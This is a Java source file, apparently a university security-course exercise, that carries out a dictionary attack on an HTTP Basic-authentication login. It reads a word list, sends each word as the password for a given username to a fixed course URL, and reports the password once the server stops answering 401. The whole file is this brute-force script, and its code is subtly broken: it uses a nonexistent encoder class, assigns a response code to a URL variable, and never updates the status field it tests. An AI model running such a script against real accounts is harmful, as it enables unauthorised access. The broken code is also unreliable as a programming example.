import java.io.*;
import java.net.*;
import java.text.*;
import java.util.*;

class Dictionary {

    private String password="";

    private int num=401;


    public static void main(String[] args) {


      Dictionary URLcon;

      int length = 0;

      String passwd="";

       int t0,t1;

      String line ="";
      
      if (args.length == 0) {
      	
      System.err.println (
      		
      		"Usage : java BruteForce <username>");
      return;
      	
      }
      
      String username = args[0];
      
      
      t0=System.currentTimeMillis();
      
      System.out.println ("  " + new Date());
      System.out.println ("Using Dictionary method  attack "+username+"'s password.  Please waiting.......");

      try{ BufferedReader in = new BufferedReader(new FileReader("/usr/share/lib/dict/words"));

           while ((passwd=in.readLine())!=null) {

           	 URLcon = new Dictionary (passwd,username);

             if ((URLcon.num)!=401) {

             	t1=System.currentTimeMillis();

                System.out.println("The password: "+ passwd);

             	double dt =t1-t0;

             	System.out.println("It took "+DecimalFormat.getInstance().format(dt/1000)+ " seconds");
                
                System.out.println ("Finish  " + new Date());
                
             	return;

             }


           	}

      }catch (FileNotFoundException e){
      	System.out.println(e);
      }catch (IOException e){
      	System.out.println(e);
      }


       System.out.println(" not find the password");


}

   public  Dictionary  (String password,String username) {

  	  String urlString =  "http://sec-crack.cs.rmit.edu./SEC/2/" ;

      
      try {

        String userPassword = username+":"+password ;

        String encoding = new userPassword.misc.BASE64Encoder().encode (userPassword.getBytes());

        URL url = new URL (urlString);

        HttpURLConnection uc = (HttpURLConnection) url.openConnection();

        uc.setRequestProperty ("Authorization", " " + encoding);

         url = uc.getResponseCode();


       }
        catch(MalformedURLException e){
       	  System.out.println(e);
       }catch(IOException e){
          System.out.println(e);
       }


   }
}